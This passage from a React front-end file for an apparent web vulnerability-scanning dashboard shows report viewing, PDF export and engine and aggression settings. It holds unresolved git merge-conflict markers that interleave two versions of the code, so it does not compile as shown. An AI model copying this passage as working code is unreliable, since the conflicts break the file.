                        <span className="font-medium">Back to Reports List</span>
                      </button>
                      
                      <div className="h-6 w-px bg-zinc-700 mx-2"></div>
                      
                      <div>
                        <h2 className="text-lg font-bold text-white leading-tight">Vulnerability Analysis</h2>
                        <div className="flex items-center gap-2 text-xs text-zinc-500 font-mono mt-0.5">
                           <span className="hidden sm:inline">ID: {selectedVulnId.split('-')[0]}...</span>
                           <span className="hidden sm:inline">•</span>
                           <span className={isOfflineReport ? "text-yellow-500" : "text-emerald-500"}>
                             {isOfflineReport ? "Template Generated" : "AI Generated"}
                           </span>
=======
                      <button 
                        onClick={handleBackToReports}
                        className="p-2 hover:bg-zinc-800 rounded-lg text-zinc-400 hover:text-white transition-colors border border-transparent hover:border-zinc-700"
                      >
                        <ArrowLeft className="w-5 h-5" />
                      </button>
                      <div>
                        <h2 className="text-xl font-bold text-white">Vulnerability Analysis</h2>
                        <div className="flex items-center gap-2 text-xs text-zinc-500 font-mono mt-0.5">
                           <span>ID: {selectedVulnId.split('-')[0]}...</span>
                           <span>•</span>
                           <span className="text-emerald-500">AI Generated</span>
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                           {reportCache[selectedVulnId] && <span className="text-zinc-600">(Cached)</span>}
                        </div>
                      </div>
                    </div>
<<<<<<< HEAD
                    
                    <div className="flex items-center gap-3">
                      {isOfflineReport && (
                        <button 
                          onClick={handleRetryReport}
                          className="flex items-center gap-2 text-sm bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-500 px-4 py-2 rounded-lg border border-yellow-500/20 transition-colors"
                        >
                          <RefreshCw className="w-4 h-4" />
                          <span className="hidden sm:inline">Regenerate with AI</span>
                        </button>
                      )}
                      <button 
                        onClick={handleDownloadPDF}
                        disabled={isExporting}
                        className="flex items-center gap-2 text-sm bg-primary/10 hover:bg-primary/20 text-primary px-4 py-2 rounded-lg border border-primary/20 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        {isExporting ? <Loader2 className="w-4 h-4 animate-spin" /> : <Download className="w-4 h-4" />}
                        <span className="hidden sm:inline">Export PDF</span>
                      </button>
                    </div>
                  </div>
                  
                  <div className="flex-1 overflow-y-auto p-8 relative" id="report-content">
                    {/* Offline Banner */}
                    {isOfflineReport && (
                      <div className="mb-6 p-4 rounded-lg bg-yellow-500/5 border border-yellow-500/20 flex items-start gap-4">
                        <div className="p-2 bg-yellow-500/10 rounded-lg shrink-0">
                          <WifiOff className="w-5 h-5 text-yellow-500" />
                        </div>
                        <div>
                          <h4 className="text-sm font-bold text-yellow-500 mb-1">Offline Mode Active</h4>
                          <p className="text-xs text-zinc-400 leading-relaxed">
                            The AI analysis engine is currently unavailable due to high demand or network constraints. 
                            This report was generated using high-fidelity security templates to ensure you receive immediate guidance.
                            You can attempt to regenerate this report using the button above when services are restored.
                          </p>
                        </div>
                      </div>
                    )}

=======
                    <button className="flex items-center gap-2 text-sm bg-primary/10 hover:bg-primary/20 text-primary px-4 py-2 rounded-lg border border-primary/20 transition-colors">
                      <Download className="w-4 h-4" />
                      Export Report
                    </button>
                  </div>
                  
                  <div className="flex-1 overflow-y-auto p-8">
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                    <article className="prose prose-invert prose-headings:text-emerald-400 prose-p:text-zinc-300 prose-a:text-blue-400 prose-code:text-orange-300 prose-pre:bg-zinc-900 prose-pre:border prose-pre:border-zinc-800 max-w-4xl mx-auto">
                      <ReactMarkdown>{aiReport}</ReactMarkdown>
                    </article>
                  </div>
                </div>
              )}
            </div>
          )}

<<<<<<< HEAD
          {activeTab === 'assistant' && (
            <div className="h-[70vh]">
                <ChatInterface />
            </div>
          )}

=======
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
          {activeTab === 'config' && (
             <div className="grid md:grid-cols-2 gap-8">
               <div className="bg-surface p-6 rounded-xl border border-zinc-800">
                  <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                    <Settings2 className="w-5 h-5" /> Engine Configuration
                  </h3>
                  <div className="space-y-4">
                    {Object.entries(config.engines).map(([key, value]) => (
                      <label key={key} className="flex items-center justify-between p-4 rounded-lg bg-black/20 border border-zinc-800 hover:border-zinc-700 cursor-pointer transition-all">
                        <div className="flex flex-col">
<<<<<<< HEAD
                           <div className="flex items-center gap-2">
                             <span className="capitalize font-medium text-zinc-200">{key} Engine</span>
                             <Tooltip content={engineDescriptions[key]} position="top">
                               <Info className="w-3.5 h-3.5 text-zinc-500 hover:text-primary transition-colors cursor-help" />
                             </Tooltip>
                           </div>
=======
                           <span className="capitalize font-medium text-zinc-200">{key} Engine</span>
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                           <span className="text-xs text-zinc-500">
                             {key === 'recon' && 'Subdomains, VHosts, Directory Enumeration'}
                             {key === 'fuzzing' && 'Payload Injection (SQLi, XSS, RCE)'}
                             {key === 'custom' && 'User-defined wordlists and scenarios'}
                             {key === 'reporting' && 'AI-driven analysis and PDF generation'}
                           </span>
                        </div>
                        <div className={`w-12 h-6 rounded-full p-1 transition-colors ${value ? 'bg-primary' : 'bg-zinc-700'}`}
                             onClick={() => setConfig(p => ({...p, engines: {...p.engines, [key]: !value}}))}>
                          <div className={`bg-white w-4 h-4 rounded-full shadow-md transform transition-transform ${value ? 'translate-x-6' : 'translate-x-0'}`} />
                        </div>
                      </label>
                    ))}
                  </div>
               </div>

               <div className="bg-surface p-6 rounded-xl border border-zinc-800">
                  <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                    <AlertTriangle className="w-5 h-5" /> Aggression Profile
                  </h3>
                  <div className="space-y-4">
                    {['stealth', 'standard', 'aggressive'].map((level) => (
                      <button
                        key={level}
                        onClick={() => setConfig(prev => ({ ...prev, aggressionLevel: level as any }))}
<<<<<<< HEAD
                        className={`w-full text-left p-4 rounded-lg border transition-all flex items-center justify-between group ${
=======
                        className={`w-full text-left p-4 rounded-lg border transition-all flex items-center justify-between ${
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                          config.aggressionLevel === level 
                          ? 'bg-primary/10 border-primary text-primary' 
                          : 'bg-black/20 border-zinc-800 text-zinc-400 hover:border-zinc-600'
                        }`}
                      >
<<<<<<< HEAD
                        <div className="flex items-center gap-2">
                          <span className="capitalize font-medium">{level} Mode</span>
                          <Tooltip content={aggressionDescriptions[level]} position="top">
                            <Info className={`w-3.5 h-3.5 hover:text-white transition-colors cursor-help ${
                              config.aggressionLevel === level ? 'text-primary/70' : 'text-zinc-600'
                            }`} />
                          </Tooltip>
                        </div>
=======
                        <span className="capitalize font-medium">{level} Mode</span>
>>>>>>> 797518b03511d5071e7f78b9cb4370341279f268
                        {config.aggressionLevel === level && <ChevronRight className="w-5 h-5" />}
                      </button>
                    ))}
                  </div>
                  <div className="mt-6 p-4 bg-yellow-500/10 border border-yellow-500/20 rounded text-sm text-yellow-500">
                    <strong>Warning:</strong> Aggressive mode generates high traffic and may trigger WAF IP bans. Use only on authorized targets.
                  </div>
               </div>
             </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default App;
